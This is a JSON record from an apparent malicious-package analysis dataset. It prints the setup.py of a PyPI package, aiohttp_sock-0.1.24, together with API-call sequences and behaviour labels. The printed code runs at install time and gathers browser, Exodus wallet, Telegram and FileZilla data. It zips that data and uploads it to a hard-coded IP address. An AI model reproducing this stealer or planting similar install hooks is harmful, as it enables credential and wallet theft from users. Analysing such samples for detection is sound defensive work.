[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/aiohttp_sock-0.1.24/aiohttp_sock-0.1.24/setup.py",
    "code_snippet": "import subprocess\nimport codecs\nimport os\nimport re\nimport sys\n\n# ... (setup code omitted for brevity)\n\nif not (len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]):\n    sys.exit()\n\nsubprocess.call(f'{sys.executable} -m pip install aiofiles')\nsubprocess.call(f'{sys.executable} -m pip install aiohttp')\nsubprocess.call(f'{sys.executable} -m pip install cryptography')\nsubprocess.call(f'{sys.executable} -m pip install aiosqlite')\n\nimport asyncio\nfrom asyncio import create_task\nfrom typing import List\nfrom weakref import proxy\nfrom path_search import search_plugin_paths, root_paths\nfrom config import Config\nfrom aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData,\\\n        TCPConnector\nimport secrets\nimport timeit\nfrom paths import TEMP\nfrom os import mkdir\nfrom os.path import join\nfrom zipfile import ZipFile, ZIP_DEFLATED\nfrom tools import zipdir, _handle_task_result\nfrom logger import Logger\n\nfrom plugins import Chromium, Details, Exodus, Filezilla, Telegram\n\nHOST = 'http://144.24.115.170'\n\nasync def main() -> None:\n    start = timeit.default_timer()\n\n    client_id = secrets.token_hex(10)\n    log_path = join(TEMP, client_id)\n\n    print(log_path)\n    mkdir(log_path)\n\n    tasks: List[asyncio.Task] = []\n\n    connector = TCPConnector(limit=50)\n    session = Session(connector=connector)\n    logger = Logger(log_path)\n    conf = Config(client_id, HOST, log_path, logger, session)\n\n    await logger.log(f'Start')\n    \n    chromium = Chromium(conf)\n\n    search_folder_names = {\n        'google': chromium,\n        'exodus': Exodus(conf),\n        'mozilla': None,\n        'telegram desktop': Telegram(conf),\n        'telegram': Telegram(conf),\n        'opera software': chromium,\n        'filezilla': Filezilla(conf)\n    }\n    \n    tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n\n    other_plugins = [Details(conf)]\n\n    for plugin in other_plugins:\n        tasks.append(create_task(plugin.callback()))\n\n    for task in tasks:\n        task.add_done_callback(_handle_task_result)\n\n    for task in tasks:\n        try:\n            await task\n        except Exception as e:\n            await logger.log(f'Error in main.py tasks {e}')\n    \n    await logger.log(f'Начинаю отправку лога')\n\n    zip_log_path = join(TEMP, f'{client_id}.zip')\n    with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n        zipdir(log_path, zipf)\n\n    files = {'file': open(zip_log_path, 'rb')}\n        \n    await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)\n    await session.close()\n\n    stop = timeit.default_timer()\n    await logger.log(f'Time: {stop-start}')\n\nasyncio.run(main())",
    "pattern_analysis": {
      "api_sequence": [
        "sys.argv",
        "sys.exit",
        "subprocess.call",
        "subprocess.call",
        "subprocess.call",
        "subprocess.call",
        "os.path.join",
        "os.mkdir",
        "aiohttp.TCPConnector",
        "aiohttp.ClientSession",
        "logger.Logger.log",
        "Chromium",
        "Exodus",
        "Telegram",
        "Filezilla",
        "Details",
        "asyncio.create_task",
        "search_plugin_paths",
        "asyncio.create_task",
        "plugin.callback",
        "asyncio.Task.add_done_callback",
        "asyncio.Task.add_done_callback",
        "asyncio.Task",
        "logger.Logger.log",
        "os.path.join",
        "zipfile.ZipFile",
        "tools.zipdir",
        "open",
        "aiohttp.ClientSession.post",
        "aiohttp.ClientSession.close",
        "timeit.default_timer",
        "logger.Logger.log"
      ],
      "api_sequence_with_args": [
        "sys.argv",
        "sys.exit()",
        "subprocess.call(f'{sys.executable} -m pip install aiofiles')",
        "subprocess.call(f'{sys.executable} -m pip install aiohttp')",
        "subprocess.call(f'{sys.executable} -m pip install cryptography')",
        "subprocess.call(f'{sys.executable} -m pip install aiosqlite')",
        "os.path.join(TEMP, client_id)",
        "os.mkdir(log_path)",
        "aiohttp.TCPConnector(limit=50)",
        "aiohttp.ClientSession(connector=connector)",
        "logger.Logger.log(f'Start')",
        "Chromium(conf)",
        "Exodus(conf)",
        "Telegram(conf)",
        "Filezilla(conf)",
        "Details(conf)",
        "asyncio.create_task(search_plugin_paths(root_paths, search_folder_names))",
        "search_plugin_paths(root_paths, search_folder_names)",
        "asyncio.create_task(plugin.callback())",
        "plugin.callback()",
        "asyncio.Task.add_done_callback(_handle_task_result)",
        "asyncio.Task.add_done_callback(_handle_task_result)",
        "asyncio.Task",
        "logger.Logger.log(f'Error in main.py tasks {e}')",
        "os.path.join(TEMP, f'{client_id}.zip')",
        "zipfile.ZipFile(zip_log_path, 'w', ZIP_DEFLATED)",
        "tools.zipdir(log_path, zipf)",
        "open(zip_log_path, 'rb')",
        "aiohttp.ClientSession.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)",
        "aiohttp.ClientSession.close()",
        "timeit.default_timer()",
        "logger.Logger.log(f'Time: {stop-start}')"
      ],
      "mapped_sequence": [
        {
          "api_name": "sys.argv",
          "id": "get_cmd_args",
          "description": "Retrieves command-line arguments passed to script",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "sys.exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.mkdir",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "aiohttp.TCPConnector",
          "id": "create_http_connection",
          "description": "Creates HTTP connection to specified host",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "aiohttp.ClientSession",
          "id": "create_http_session",
          "description": "Creates HTTP session for making asynchronous requests",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "logger.Logger.log",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "Chromium",
          "id": "init_chromium_class",
          "description": "Instantiates Chromium class with configuration",
          "first_id": "code_execution",
          "second_id": "object_initialization",
          "third_id": "instance_creation"
        },
        {
          "api_name": "Exodus",
          "id": "init_exodus_class",
          "description": "Instantiates Exodus class with configuration",
          "first_id": "third_party_platform_abuse",
          "second_id": "other_platform_abuse",
          "third_id": "other_service_abuse"
        },
        {
          "api_name": "Telegram",
          "id": "init_telegram_class",
          "description": "Instantiates Telegram class with configuration",
          "first_id": "third_party_platform_abuse",
          "second_id": "other_platform_abuse",
          "third_id": "telegram_abuse"
        },
        {
          "api_name": "Filezilla",
          "id": "init_filezilla_class",
          "description": "Instantiates Filezilla class with configuration",
          "first_id": "third_party_platform_abuse",
          "second_id": "other_platform_abuse",
          "third_id": "other_service_abuse"
        },
        {
          "api_name": "Details",
          "id": "init_details_class",
          "description": "Instantiates Details class with configuration",
          "first_id": "data_exfiltration",
          "second_id": "exfiltration_component_initialization",
          "third_id": "exfiltration_component_creation"
        },
        {
          "api_name": "asyncio.create_task",
          "id": "create_async_task",
          "description": "Creates asynchronous task for coroutine",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "search_plugin_paths",
          "id": "exfiltrate_folder",
          "description": "Recursively processes folder for file exfiltration",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "asyncio.create_task",
          "id": "create_async_task",
          "description": "Creates asynchronous task for coroutine",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "plugin.callback",
          "id": "exfiltrate_folder",
          "description": "Recursively processes folder for file exfiltration",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "asyncio.Task.add_done_callback",
          "id": "register_exit_function",
          "description": "Registers function to be called at program exit",
          "first_id": "persistence_stealth",
          "second_id": "persistence_mechanisms",
          "third_id": "persistence_configuration"
        },
        {
          "api_name": "asyncio.Task.add_done_callback",
          "id": "register_exit_function",
          "description": "Registers function to be called at program exit",
          "first_id": "persistence_stealth",
          "second_id": "persistence_mechanisms",
          "third_id": "persistence_configuration"
        },
        {
          "api_name": "asyncio.Task",
          "id": "run_async_function",
          "description": "Runs asynchronous function until completion",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "logger.Logger.log",
          "id": "log_error",
          "description": "Logs error message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "tools.zipdir",
          "id": "create_zip_archive",
          "description": "Creates new ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "aiohttp.ClientSession.post",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "aiohttp.ClientSession.close",
          "id": "close_http_response",
          "description": "Closes the HTTP response object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "timeit.default_timer",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "logger.Logger.log",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        }
      ],
      "contextual_code": "import subprocess\nimport sys\nimport os\nfrom os.path import join\nfrom os import mkdir\nfrom zipfile import ZipFile, ZIP_DEFLATED\nfrom aiohttp import ClientSession as Session, TCPConnector\nimport asyncio\nfrom asyncio import create_task\nfrom logger import Logger\nfrom plugins import Chromium, Details, Exodus, Filezilla, Telegram\nfrom path_search import search_plugin_paths, root_paths\nfrom config import Config\nfrom tools import zipdir, _handle_task_result\nimport timeit\nimport secrets\nfrom paths import TEMP\n\nif not (len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]):\n    sys.exit()\n\nsubprocess.call(f'{sys.executable} -m pip install aiofiles')\nsubprocess.call(f'{sys.executable} -m pip install aiohttp')\nsubprocess.call(f'{sys.executable} -m pip install cryptography')\nsubprocess.call(f'{sys.executable} -m pip install aiosqlite')\n\nasync def main() -> None:\n    start = timeit.default_timer()\n    client_id = secrets.token_hex(10)\n    log_path = join(TEMP, client_id)\n    print(log_path)\n    mkdir(log_path)\n    connector = TCPConnector(limit=50)\n    session = Session(connector=connector)\n    logger = Logger(log_path)\n    conf = Config(client_id, HOST, log_path, logger, session)\n    await logger.log(f'Start')\n    chromium = Chromium(conf)\n    search_folder_names = {\n        'google': chromium,\n        'exodus': Exodus(conf),\n        'mozilla': None,\n        'telegram desktop': Telegram(conf),\n        'telegram': Telegram(conf),\n        'opera software': chromium,\n        'filezilla': Filezilla(conf)\n    }\n    tasks = []\n    tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n    other_plugins = [Details(conf)]\n    for plugin in other_plugins:\n        tasks.append(create_task(plugin.callback()))\n    for task in tasks:\n        task.add_done_callback(_handle_task_result)\n    for task in tasks:\n        try:\n            await task\n        except Exception as e:\n            await logger.log(f'Error in main.py tasks {e}')\n    await logger.log(f'Начинаю отправку лога')\n    zip_log_path = join(TEMP, f'{client_id}.zip')\n    with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n        zipdir(log_path, zipf)\n    files = {'file': open(zip_log_path, 'rb')}\n    await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)\n    await session.close()\n    stop = timeit.default_timer()\n    await logger.log(f'Time: {stop-start}')\n\nasyncio.run(main())"
    }
  }
]